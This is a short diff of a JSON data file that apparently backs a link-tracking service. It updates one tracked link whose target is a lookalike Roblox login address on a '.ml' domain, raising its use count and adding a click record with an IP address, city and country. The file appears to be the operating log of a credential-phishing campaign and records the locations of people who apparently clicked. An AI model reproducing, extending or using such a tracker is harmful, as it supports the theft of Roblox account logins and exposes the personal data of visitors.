@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 159,
+    "useCount": 160,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1382,6 +1382,14 @@
         "ip": "91.172.233.117",
         "country": "France",
         "city": "Montigny-lès-Cormeilles",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
+      },
+      {
+        "timestamp": 1776957604094,
+        "ip": "78.242.135.1",
+        "country": "France",
+        "city": "L'Union",
         "flag": "🇫🇷",
         "countryCode": "FR"
       }
